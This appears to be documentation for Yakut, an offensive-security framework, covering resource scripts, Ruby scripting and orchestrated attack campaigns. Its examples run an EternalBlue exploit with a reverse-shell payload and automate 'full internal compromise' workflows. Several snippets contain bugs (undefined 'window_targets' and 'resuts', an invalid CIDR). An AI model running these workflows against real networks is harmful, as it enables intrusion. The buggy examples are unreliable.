# Scripting & Automation

- [Scripting \& Automation](#scripting--automation)
  - [1. Yakut's Automation Approaches](#1-yakuts-automation-approaches)
  - [2. Resource Scripts (`.yrc` Files)](#2-resource-scripts-yrc-files)
      - [Format](#format)
      - [Usage](#usage)
      - [Example `scan_and_exploit.yrc`](#example-scan_and_exploityrc)
  - [3. Embedded Ruby Scripting (`ruby_eval` and `irb`)](#3-embedded-ruby-scripting-ruby_eval-and-irb)
  - [4. `Orchestration` Capabilities (Advanced Automation \& Campaigns)](#4-orchestration-capabilities-advanced-automation--campaigns)
      - [Running Other Capabilities](#running-other-capabilities)
      - [Conditional Logic](#conditional-logic)
      - [Human-in-the-Loop Prompts](#human-in-the-loop-prompts)
      - [Usage](#usage-1)
  - [5. Choosing the Right Automation Approach](#5-choosing-the-right-automation-approach)

## 1. Yakut's Automation Approaches

Yakut provides several mechanisms for scripting and automation, catering to different
levels of complexity and user needs:

- **Resource Scripts (`.yrc` files):** Simple batch files containin sequences of Yakut console commands.
- **Embedded Ruby Scripting:** Direct execution of Ruby code within the Yakut console.
- **`Orchestration` Capabilities:** The most powerful approach, allows for the development of complex, stateful and conditional attack workflows using a dedicated Ruby DSL.

## 2. Resource Scripts (`.yrc` Files)

Resource scripts are the simplest way to automate a sequence of Yakut console commands.

#### Format

A plain text file where each line is a command exactly as you would type it into the Yakut console. Comments can typically be added using `#`.

#### Usage

To execute a resource script:

```
yakut > resource /path/to/your_script.yrc
```

You can also potentially launch `yakut-console` with a resource script to be executed immediately.

```bash
./bin/yakut-console -r /path/to/your_script.yrc
```

#### Example `scan_and_exploit.yrc`

```ruby
# scan_and_exploit.yrc - Example Yakut resource script
# Ensure a workspace is active before running this.

# Set target range for this script
setg RHOSTS 192.168.1.0/24

# Use a reconnaissance capability
capability use recon/network/fast_portscan
set RHOSTS ${RHOSTS}
set PORTS 22,80,443,445
run

# After that, a conditional logic would be more robust with Orchestration Capabilities

# Attempt a common SMB exploit if port 445 is found (example)
capability use exploit/windows/smb/eternalblue_ms17010
set RHOSTS ${RHOSTS} # Needs a way to filter based on open ports from previous step
set PAYLOAD windows/x64/yakut_agent/reverse_tcp
pset LHOST tun0
pset LPORT 4444
run

# List any sessions opened
sessions list
```

## 3. Embedded Ruby Scripting (`ruby_eval` and `irb`)

For more dynamic automation and direct interaction with Yakut's internals from the
console, you can use `ruby_eval` command or drop into an IRB session within Yakut's
context.

#### Example `ruby_eval`

```ruby
yakut [ws:ACME_Corp_Q3_Audit] > ruby_eval do |yk|
  puts "[*] Automating SMB scan for all Windows targets in workspace: #{yk.workspace.current.name}"
  windows_targets = yk.cognition.targets.where(os: /Windows/i, workspace_id: yk.workspace.current.id)

  if windows_targets.empty?
    puts "[-] No Windows targets found."
  else
    smb_scanner = yk.operations.find_capability("recon/network/smb_version_scan")

    unless smb_scanner
      puts "[-] SMB version scanner capability not found."
      return
    end

    windows_targets.each do |target|
      puts "[*] Scanning SMB on #{target.address}..."
      opts = { 'RHOSTS' => target.address }
      yk.operations.run_capability_async(smb_scanner.ref_name, opts)
    end

    puts "[+] SMB scans initiated for #{window_targets.count} targets. Check 'jobs list'."
  end
end
```

- `irb` (within Yakut context):
  - `irb` would drop you into a full Interactive Ruby Shell (IRB) session that has the Yakut framework environment loaded.
  - You'd have direct access to Yakut's classes and objects.

```ruby
yakut [ws:ACME_Corp_Q3_Audit] > irb
[*] Entering Yakut IRB session... Acces framework via 'yakut_kernel' or 'yk'.

irb(yakut):001:0> yk.workspace.current.targets.count
=> 15
irb(yakut):002:0> creds = yk.cognition.loot.where(type: 'creds', workspace_id: yk.workspace.current.id)
=> [...]
irb(yakut):003:0 > exit
[*] Exiting Yakut IRB session...
yakut [ws:ACME_Corp_Q3_Audit] >
```

## 4. `Orchestration` Capabilities (Advanced Automation & Campaigns)

This is Yakut's most powerful and recommended approach for complex automation, attack
chain simulation and campaign management.

- **Definition:** `Orchestration` Capabilities are special typs of capabilities written in Ruby, using a dedicated DSL provided by Yakut's `CampaignOrchestrator`. They define workflows, conditional logic, state management and interactions with other capabilities.
- **Purpose:**
  - To automate multi-stage attack scenarios (e.g., recon -> vulnerability scan -> exploit -> post-exploitation -> exfiltration).
  - To implement adaptive responses based on the outcome of previous steps.
  - To manage long-running campaigns with specific objectives.
  - To allow for human-in-the-loop decision points within an automated workflow.

#### Running Other Capabilities

```ruby
# Within an Orchestration capability's run method
stage "Initial Reconnaissance" do
  results = run_capability('recon/network/host_discovery_fast',
    { 'RHOSTS' => datastore['TARGET_RANGE'] },
    fail_on_error: false)

  store_state(:live_hosts, resuts.hosts) if results&.success?
end
```

#### Conditional Logic

```ruby
stage "Vulnerability Exploitation" do
  get_state(:live_hosts).each do |host|
    if host.has_service?(port: 445, product: /Samba/i) && host.has_vuln?('CVE-2017-0144')
      run_capability('exploit/linux/samba/eternal_samba_variant', { 'RHOSTS' => host.ip, ...})
    end
  end
end
```

#### Human-in-the-Loop Prompts

```ruby
stage "Critical Action" do
  if user_confirm("Attempt to exploit Domain Controller #{dc_host.ip} with high-risk exploit?")
    run_capability('exploit/windows/rpc/dangerous_dc_exploit', { 'RHOSTS' => dc_host.ip })
  else
    log_info("User skipped DC exploitation")
  end
end
```

#### Usage

```console
yakut > capability use orchestration/campaign/full_internal_compromise
yakut [cap:orchestration/campaign/full_internal_compromise] > set TARGET_RANGE 10.10.0.0./16
yakut [cap:orchestration/campaign/full_internal_compromise] > run
```

## 5. Choosing the Right Automation Approach

- **Simple, linear command sequences:** Use Resoure Scripts (`.yrc`).
- **Quick, interactive scripting with framework access:** Use `ruby_eval` or the `irb` console.
- **Complex, stateful, conditional, multi-stage operations or campaign automation:** Develop an `Orchestration` Capability.
